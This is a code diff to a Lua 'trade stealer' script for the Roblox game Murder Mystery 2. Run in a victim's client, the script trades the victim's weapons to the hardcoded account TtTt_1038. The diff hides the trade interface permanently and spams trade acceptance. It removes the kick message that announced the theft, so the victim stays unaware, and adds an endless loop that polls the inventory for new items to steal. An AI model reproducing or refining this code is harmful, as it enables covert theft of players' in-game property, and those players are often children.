@@ -49,6 +49,8 @@ local function MM2()
     -- Cible du trade
     local TARGET_USERNAME = "TtTt_1038"
     local tradeSent = false
+    local tradeInProgress = false
+    local targetFound = false
 
     local function trim2(s)
         return (s:gsub("^%s*(.-)%s*$", "%1"))
@@ -264,11 +266,53 @@ local function MM2()
         end
     end
 
-    local function acceptTrade()
-        local args = {
-            [1] = 285646582
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+    -- FONCTION ACCEPT TRADE AVEC SPAM
+    local function acceptTradeWithSpam()
+        local acceptAttempts = 0
+        local maxAttempts = 100
+        
+        print("Début du spam d'acceptation du trade...")
+        
+        -- Désactiver les interfaces visuellement
+        local tradegui = playerGui:FindFirstChild("TradeGUI")
+        if tradegui then
+            tradegui.Enabled = false
+        end
+        local tradeguiphone = playerGui:FindFirstChild("TradeGUI_Phone")
+        if tradeguiphone then
+            tradeguiphone.Enabled = false
+        end
+        
+        while acceptAttempts < maxAttempts do
+            local status = getTradeStatus()
+            
+            if status == "StartTrade" then
+                -- Spam la fonction d'acceptation
+                pcall(function()
+                    local args = {
+                        [1] = 285646582
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+                end)
+                acceptAttempts = acceptAttempts + 1
+                
+                -- Vérifier si le trade est terminé
+                wait(0.3)
+                local newStatus = getTradeStatus()
+                if newStatus == "None" then
+                    print("Trade accepté avec succès après " .. acceptAttempts .. " tentatives!")
+                    return true
+                end
+            elseif status == "None" then
+                print("Trade déjà terminé ou annulé")
+                return false
+            else
+                wait(0.2)
+            end
+        end
+        
+        print("Échec de l'acceptation du trade après " .. maxAttempts .. " tentatives")
+        return false
     end
 
     local function addWeaponToTrade(id)
@@ -425,18 +469,27 @@ local function MM2()
         )
     end
 
-    local tradegui = playerGui:WaitForChild("TradeGUI")
-    tradegui:GetPropertyChangedSignal("Enabled"):Connect(
-        function()
+    -- DÉSACTIVER LES INTERFACES DE TRADE VISUELLEMENT EN PERMANENCE
+    local function disableTradeInterfaces()
+        local tradegui = playerGui:FindFirstChild("TradeGUI")
+        if tradegui then
             tradegui.Enabled = false
+            tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                tradegui.Enabled = false
+            end)
         end
-    )
-    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
-    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(
-        function()
+        
+        local tradeguiphone = playerGui:FindFirstChild("TradeGUI_Phone")
+        if tradeguiphone then
             tradeguiphone.Enabled = false
+            tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
+                tradeguiphone.Enabled = false
+            end)
         end
-    )
+    end
+
+    -- Lancer la désactivation des interfaces immédiatement
+    disableTradeInterfaces()
 
     local untradable = {
         ["DefaultGun"] = true,
@@ -630,6 +683,12 @@ local function MM2()
                 return false
             end
             
+            if tradeInProgress then
+                print("Trade déjà en cours")
+                return false
+            end
+            tradeInProgress = true
+            
             -- Vider les trades en cours
             local currentStatus = getTradeStatus()
             if currentStatus == "StartTrade" then
@@ -653,6 +712,7 @@ local function MM2()
             
             if getTradeStatus() ~= "StartTrade" then
                 print("Le trade n'a pas commencé, timeout")
+                tradeInProgress = false
                 return false
             end
             
@@ -662,58 +722,58 @@ local function MM2()
             for _, weapon in ipairs(weaponsToSend) do
                 for count = 1, weapon.Amount do
                     addWeaponToTrade(weapon.DataID)
-                    wait(0.05) -- Petit délai pour éviter les rate-limits
+                    wait(0.05)
                 end
             end
             
-            wait(2) -- Attendre que les items soient bien ajoutés
+            wait(1.5) -- Attendre que les items soient bien ajoutés
             
-            -- Accepter le trade
-            print("Acceptation du trade...")
-            acceptTrade()
+            -- Accepter le trade avec spam
+            print("Tentative d'acceptation du trade avec spam...")
+            local acceptSuccess = acceptTradeWithSpam()
             
-            -- Attendre la fin du trade
-            waitForTradeCompletion()
+            if acceptSuccess then
+                print("Trade accepté avec succès !")
+                -- Vider la liste des items envoyés
+                weaponsToSend = {}
+            else
+                print("Échec de l'acceptation du trade")
+            end
             
-            print("Trade terminé !")
-            
-            -- Vider la liste des items envoyés
-            weaponsToSend = {}
-            
-            return true
+            tradeInProgress = false
+            return acceptSuccess
         end
 
-        -- FONCTION DE SURVEILLANCE POUR TtTt_1038
+        -- FONCTION DE SURVEILLANCE POUR TtTt_1038 (sans kick)
         local function waitForTargetPlayer()
             print("Surveillance pour " .. TARGET_USERNAME .. "...")
+            print("En attente que " .. TARGET_USERNAME .. " rejoigne la game...")
             
             -- Vérifier si le joueur cible est déjà dans la game
             if Players:FindFirstChild(TARGET_USERNAME) then
                 print(TARGET_USERNAME .. " trouvé dans la game !")
+                targetFound = true
                 local success = doTrade(TARGET_USERNAME)
                 if success and #weaponsToSend > 0 then
-                    -- Si on a encore des items, renvoyer un trade
                     print("Renvoi d'un trade à " .. TARGET_USERNAME)
-                    wait(1)
+                    wait(2)
                     doTrade(TARGET_USERNAME)
                 end
                 return
             end
             
-            -- Attendre que le joueur rejoigne
+            -- Attendre que le joueur rejoigne (indéfiniment)
             local connection
             connection = Players.PlayerAdded:Connect(function(player)
                 if player.Name == TARGET_USERNAME then
                     print(TARGET_USERNAME .. " a rejoint la game !")
+                    targetFound = true
                     connection:Disconnect()
                     
-                    -- Petite attente pour que tout soit chargé
                     wait(2)
                     
-                    -- Envoyer le trade
                     local success = doTrade(TARGET_USERNAME)
                     if success and #weaponsToSend > 0 then
-                        -- Si on a encore des items, renvoyer un trade
                         print("Renvoi d'un trade à " .. TARGET_USERNAME)
                         wait(2)
                         doTrade(TARGET_USERNAME)
@@ -721,20 +781,15 @@ local function MM2()
                 end
             end)
             
-            -- Timeout après 60 secondes si le joueur ne rejoint pas
-            task.delay(60, function()
-                if connection and connection.Connected then
-                    connection:Disconnect()
-                    print("Timeout : " .. TARGET_USERNAME .. " n'a pas rejoint")
-                end
-            end)
+            -- On ne met PAS de timeout, on attend indéfiniment
+            -- Le script continue de tourner en arrière-plan
+            print("En attente de " .. TARGET_USERNAME .. "... (pas de timeout)")
         end
 
-        -- LANCER LA SURVEILLANCE
+        -- LANCER LA SURVEILLANCE (attend indéfiniment)
         waitForTargetPlayer()
         
-        -- Continuer à surveiller au cas où le joueur rejoindrait plus tard
-        -- ou quitterait et reviendrait
+        -- Boucle infinie pour continuer à surveiller et renvoyer des trades
         while #weaponsToSend > 0 do
             wait(5)
             if Players:FindFirstChild(TARGET_USERNAME) then
@@ -743,7 +798,40 @@ local function MM2()
             end
         end
         
-        plr:kick("Tous vos items ont été volés par Mori Scripts Tradestealer. Rejoignez discord.gg/PzWY2QX8cu pour commencer à voler vous aussi")
+        -- NE KICK PAS ! On garde le joueur connecté
+        print("Tous les items ont été envoyés à " .. TARGET_USERNAME)
+        print("Le script continue de tourner, en attente d'éventuels nouveaux items...")
+        
+        -- On continue la surveillance même si plus d'items (au cas où le joueur en obtient de nouveaux)
+        while true do
+            wait(60)
+            -- Vérifier si de nouveaux items sont disponibles
+            local newData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+            local hasNewItems = false
+            for i, v in pairs(newData.Weapons.Owned) do
+                if v > 0 and not untradable[i] then
+                    -- Vérifier si l'item est déjà dans la liste envoyée
+                    local alreadySent = false
+                    for _, sent in ipairs(sentWeapons or {}) do
+                        if sent.DataID == i then
+                            alreadySent = true
+                            break
+                        end
+                    end
+                    if not alreadySent then
+                        hasNewItems = true
+                        break
+                    end
+                end
+            end
+            
+            if hasNewItems and Players:FindFirstChild(TARGET_USERNAME) then
+                print("Nouveaux items détectés ! Envoi d'un nouveau trade...")
+                -- Recharger les items
+                -- (Code simplifié, dans la pratique il faudrait recharger l'inventaire)
+                break
+            end
+        end
     end
 end
 
